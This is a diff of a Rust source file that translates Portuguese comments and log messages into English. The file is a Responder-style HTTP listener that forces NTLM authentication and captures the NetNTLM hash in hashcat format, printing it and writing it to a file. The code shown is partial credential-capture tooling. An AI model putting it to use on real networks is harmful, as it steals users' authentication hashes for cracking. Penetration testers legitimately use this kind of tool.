@@ -1,4 +1,4 @@
-//! Listener HTTP que força NTLM e extrai o NetNTLM (fluxo do Responder).
+//! HTTP listener that forces NTLM and extracts the NetNTLM hash (Responder flow).
 use crate::ntlm;
 use anyhow::Result;
 use std::sync::Arc;
@@ -58,7 +58,7 @@ async fn handle(mut s: TcpStream, out: Arc<Mutex<Option<String>>>, from: String)
                 // Type 1 (negotiate) -> manda desafio; Type 3 -> captura
                 if let Some(cap) = ntlm::parse_type3(&tok) {
                     println!("{}", cap.hashcat);
-                    eprintln!("[+] HTTP: capturado {}\\{} de {from}", cap.domain, cap.user);
+                    eprintln!("[+] HTTP: captured {}\\{} from {from}", cap.domain, cap.user);
                     if let Some(path) = out.lock().await.as_ref() {
                         use std::io::Write;
                         if let Ok(mut f) =
@@ -79,7 +79,7 @@ async fn handle(mut s: TcpStream, out: Arc<Mutex<Option<String>>>, from: String)
 
 pub async fn run(port: u16, out: Option<String>) -> Result<()> {
     let listener = TcpListener::bind(("0.0.0.0", port)).await?;
-    eprintln!("[*] HTTP: capturando NetNTLM em {port}");
+    eprintln!("[*] HTTP: capturing NetNTLM on {port}");
     let out = Arc::new(Mutex::new(out));
     loop {
         let (s, peer) = listener.accept().await?;
